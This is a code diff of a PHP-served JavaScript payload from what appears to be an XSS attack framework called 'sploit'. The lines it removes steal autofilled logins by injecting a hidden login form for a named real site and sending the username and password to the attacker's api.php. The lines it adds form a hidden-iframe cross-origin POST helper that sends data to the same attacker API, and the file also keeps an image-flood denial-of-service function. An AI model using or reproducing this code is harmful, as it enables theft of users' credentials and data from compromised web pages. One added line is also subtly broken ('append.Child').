@@ -2,11 +2,13 @@
 header('Content-type: text/javascript');
 $id = (isset($_GET['id'])) ? $_GET['id'] : preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
 echo "var sploit = '{$_SERVER['HTTP_HOST']}';";
+echo "var sploitapi = 'http://{$_SERVER['HTTP_HOST']}/api.php';";
 echo "var sploitid = '$id';";
 ?>
 
+var xsshid = "display:none;width:0;height:0;";
 var gdebug = "";
-function debug(message) { gdebug += message + ". %A0"; }
+function debug(message) { gdebug += message + ", "; }
 function getCookie(name) {
 	name += "="
     var ca = document.cookie.split(';');
@@ -16,28 +18,23 @@ function getCookie(name) {
     }
     return "";
 }
+
 function setCookie(cname, cvalue, exdays) {
 	var d = new Date();
 	d.setTime(d.getTime() + (exdays*24*60*60*1000));
 	var expires = "expires="+d.toGMTString();
 	document.cookie = cname + "=" + cvalue + "; " + expires;
 }
+function xssgbi(x) { return document.getElementById(x); }
+function xssce(x) { return document.createElement(x); }
+function xsssa(x,k,v) { return x.setAttribute(k,v); }
+function xssrm(id) { var e = xssgbi(id); e.parentNode.removeChild(e); } 
 
 function capture() {
 
 }
 
-function getLogin(uname, pname, loc) {
-// console.log("get login");
-append("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
-window.setTimeout(saveLogin, 1500);
-}
-function saveLogin() {
-// console.log("save login");
-var u = document.getElementById('un54');
-var p = document.getElementById('pw54');
-if (u.value && u.value.length > 1) { cs("http://"+sploit+"/api.php?id="+sploitid+"&u="+encodeURIComponent(u.value)+"&p="+encodeURIComponent(p.value)); }
-}
+
 
 function dos(p, num) { for(i=0;i<num;i++){document.write("<img src='"+p+"' />"); } }
 function reg() {
@@ -53,28 +50,70 @@ function cs(s) {
 	var script = document.createElement("script");
 	script.type="text/javascript";
 	script.src=s;
-	d=document.getElementById("sploit");
+	var d = xssgbi("sploit");
 	if (!d) { document.write("<div id='sploit' style='display:none'>text</div>");}
-	d=document.getElementById("sploit");
+	d = xssgbi("sploit");
 //console.log(d);
 	d.appendChild(script);
 }
 
-function ci(s, st, id) { 
-// console.log("ci: " + s + " / " + st);
-//append("<img src='"+s+"' style='"+st+"' />"); 
-var i = document.createElement('img');
-i.src=s;
-i.style=st;
-document.getElementById(id).appendChild(i);
-//console.log(i);
+/**
+ * create an image. used for genertic GET requests
+ * url: url
+ * st: style attribute
+ * id: element id to append the image to
+ * err: onerror function (or false)
+ * load: onload function (or false)
+ */
+function ci(url, st, id, err, load) { 
+	var i = document.createElement('img');
+	i.src=url;
+	i.style=st;
+	if (load) { xsssa(i, "onload", load); }
+	if (err) { xsssa(i, "onerror", err); }
+	xssgbi(id).append.Child(i);
 }
 
-function append(t) {d = document.getElementById('sploit');console.log(d);r=d.innerHTML;console.log(r);d.innerHTML=t; }
+/**
+ * post data to another domain without Ajax (you never know....)
+ * XSS Cross Origin Post
+ * url: the url to post to
+ * data: (dictionary) key value array of data to post
+ * a: the api action (usually 'log')
+ */
+function xsscop(url, data, a) {
+	// create elements
+	var ifr = xssce('iframe');
+	var frm = xssce('form');
+	// set attributes
+	xsssa(ifr, "name", "cspost");
+	xsssa(ifr, "style", xsshid);
+	xsssa(ifr, "id", "xsscop");
+	xsssa(frm, "action", sploitapi+"?A="+a);
+	xsssa(frm, "method", "post");
+	xsssa(frm, "target", "cspost");
+
+	// create an input for each post variable
+	for (d in data) {
+		var e = xssce("input");
+		xsssa(e, "type", "hidden");
+		xsssa(e, "name", d);
+		xsssa(e, "value", data[d]);
+		frm.appendChild(e);
+	}
+
+	// append form to iframe
+	ifr.appendChild(frm);
+	document.body.appendChild(ifr);
+	// submit the form
+	frm.submit();
+	// remove the frame
+	xssrm("xsscop");
+}
+
+
+function xssappend(t) { xssgbi('sploit').innerHTML+=t; }
+function xsscls(t) { xssgbi('sploit').innerHTML=""; }
 
 reg();
-getLogin("username", "password", "https://bodyspace.bodybuilding.com/login/login.php");
-window.setInterval(hb, 4000);
 
-//$.get("www.mydomain.com/?url=www.google.com", function(response) { // read response});
-// username: s_omni.memberName
